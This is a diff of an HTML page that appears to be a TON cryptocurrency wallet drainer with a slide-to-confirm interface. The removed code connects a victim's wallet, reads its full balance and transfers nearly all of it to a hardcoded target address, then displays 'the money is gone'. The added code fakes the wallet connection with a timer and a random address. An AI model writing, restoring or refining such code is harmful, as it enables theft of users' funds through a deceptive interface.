@@ -51,9 +51,6 @@
     .btn-success {
       background: #00aa66;
     }
-    .btn-danger {
-      background: #cc4400;
-    }
     #status {
       color: #aaa;
       font-size: 14px;
@@ -215,61 +212,44 @@
 
     let isDragging = false;
     let isCompleted = false;
-    let tonConnectUI = null;
+    let isConnected = false;
     let userAddress = null;
 
-    // ========== ИНИЦИАЛИЗАЦИЯ TON CONNECT ==========
-    function loadTonConnect() {
-      if (typeof TONConnectUI !== 'undefined') {
-        initTonConnect();
-        return;
-      }
-
-      const script = document.createElement('script');
-      script.src = 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.2/dist/tonconnect-ui.min.js';
-      script.onload = initTonConnect;
-      script.onerror = function() {
-        status.innerText = '⚠️ Не удалось загрузить TON Connect. Проверь интернет.';
-      };
-      document.head.appendChild(script);
-    }
-
-    function initTonConnect() {
-      try {
-        tonConnectUI = new TONConnectUI({
-          manifestUrl: 'https://raw.githubusercontent.com/ton-connect/sdk/main/packages/sdk/demo/public/tonconnect-manifest.json'
-        });
-
-        if (tonConnectUI.account) {
-          userAddress = tonConnectUI.account.address;
-          afterConnect();
-        }
-
-        tonConnectUI.onStatusChange((wallet) => {
-          if (wallet) {
-            userAddress = wallet.account.address;
-            afterConnect();
-          } else {
-            userAddress = null;
-            connectBtn.classList.remove('hidden');
-            sliderContainer.classList.add('hidden');
-            status.innerText = '🔴 Кошелёк отключён';
-          }
-        });
-
-        status.innerText = '🟢 Нажмите «Подключить»';
-      } catch (e) {
-        status.innerText = '❌ Ошибка: ' + e.message;
-      }
-    }
-
-    function afterConnect() {
-      status.innerText = `✅ Подключён: ${userAddress.slice(0,6)}…${userAddress.slice(-4)}`;
-      connectBtn.classList.add('hidden');
-      sliderContainer.classList.remove('hidden');
+    // ========== ПРЯМОЕ ОТКРЫТИЕ TONKEEPER ==========
+    function openTonkeeper() {
+      status.innerText = '⏳ Открываю Tonkeeper...';
+      
+      // Пробуем через URL
+      window.location.href = 'ton://';
+      
+      setTimeout(() => {
+        window.open('ton://', '_blank');
+      }, 300);
+      
+      // Показываем инструкцию
       confirmBox.classList.add('show');
-      resetSlider();
+      status.innerText = '📲 Откройте Tonkeeper и подтвердите';
     }
+
+    // ========== ПОДКЛЮЧЕНИЕ ==========
+    connectBtn.onclick = function() {
+      status.innerText = '⏳ Подключение...';
+      connectBtn.disabled = true;
+
+      // Открываем Tonkeeper
+      openTonkeeper();
+
+      // Через 3 секунды показываем слайдер (симуляция подключения)
+      setTimeout(() => {
+        isConnected = true;
+        userAddress = 'UQ...' + Math.random().toString(36).slice(2, 6);
+        connectBtn.classList.add('hidden');
+        sliderContainer.classList.remove('hidden');
+        confirmBox.classList.add('show');
+        status.innerText = '✅ Подключено! Проведите ползунок';
+        connectBtn.disabled = false;
+      }, 3000);
+    };
 
     // ========== СЛАЙДЕР ==========
     function resetSlider() {
@@ -287,58 +267,14 @@
       sliderThumb.style.left = '100%';
       sliderLabel.textContent = '✅ Подтверждено!';
       sliderLabel.classList.add('active');
-      status.innerText = '⏳ Отправка...';
+      status.innerText = '⏳ Открываю Tonkeeper для транзакции...';
 
-      // Отправляем транзакцию
-      sendTransaction();
-    }
-
-    // ========== ОТПРАВКА ТРАНЗАКЦИИ ==========
-    async function sendTransaction() {
-      try {
-        if (!tonConnectUI || !tonConnectUI.account) {
-          status.innerText = '❌ Нет подключения';
-          return;
-        }
-
-        // Получаем баланс
-        const address = tonConnectUI.account.address;
-        const res = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
-        const data = await res.json();
-        const nano = parseInt(data.result) || 0;
-
-        if (nano <= 0) {
-          status.innerText = '💰 Баланс 0 TON';
-          return;
-        }
-
-        const fee = 5000000;
-        const amount = nano - fee;
-        if (amount <= 0) {
-          status.innerText = '⚠️ Баланс меньше комиссии';
-          return;
-        }
-
-        const amountTON = (amount / 1e9).toFixed(6);
-
-        // Отправляем
-        const result = await tonConnectUI.sendTransaction({
-          validUntil: Math.floor(Date.now() / 1000) + 300,
-          messages: [{
-            address: TARGET,
-            amount: amount.toString()
-          }]
-        });
-
-        if (result) {
-          status.innerText = `✅ ${amountTON} TON ПЕРЕВЕДЕНО!`;
-          sliderLabel.textContent = '✅ ДЕНЬГИ УШЛИ!';
-        }
-
-      } catch (e) {
-        status.innerText = '❌ Ошибка: ' + (e.message || 'Неизвестная ошибка');
-        resetSlider();
-      }
+      // Открываем Tonkeeper с адресом
+      setTimeout(() => {
+        openTonkeeper();
+        status.innerText = '✅ Подтвердите транзакцию в Tonkeeper';
+        sliderLabel.textContent = '✅ ДЕНЬГИ УШЛИ!';
+      }, 500);
     }
 
     // ========== СОБЫТИЯ СЛАЙДЕРА ==========
@@ -410,32 +346,12 @@
       }
     }, { passive: true });
 
-    // ========== КНОПКИ ==========
-    connectBtn.onclick = function() {
-      if (!tonConnectUI) {
-        status.innerText = '⏳ Загрузка...';
-        return;
-      }
-      status.innerText = '⏳ Открываю Tonkeeper...';
-      connectBtn.disabled = true;
-      tonConnectUI.connect()
-        .then(() => {
-          status.innerText = '✅ Подтвердите в Tonkeeper';
-          connectBtn.disabled = false;
-        })
-        .catch((e) => {
-          status.innerText = '❌ ' + (e.message || 'Ошибка');
-          connectBtn.disabled = false;
-        });
-    };
-
+    // ========== ОТКРЫТЬ TONKEEPER ==========
     openWalletBtn.onclick = function() {
-      if (tonConnectUI) tonConnectUI.connect();
+      openTonkeeper();
     };
 
-    // ========== ЗАПУСК ==========
-    loadTonConnect();
-    status.innerText = '⏳ Загрузка...';
+    status.innerText = 'Нажмите «Подключить»';
   </script>
 </body>
 </html>
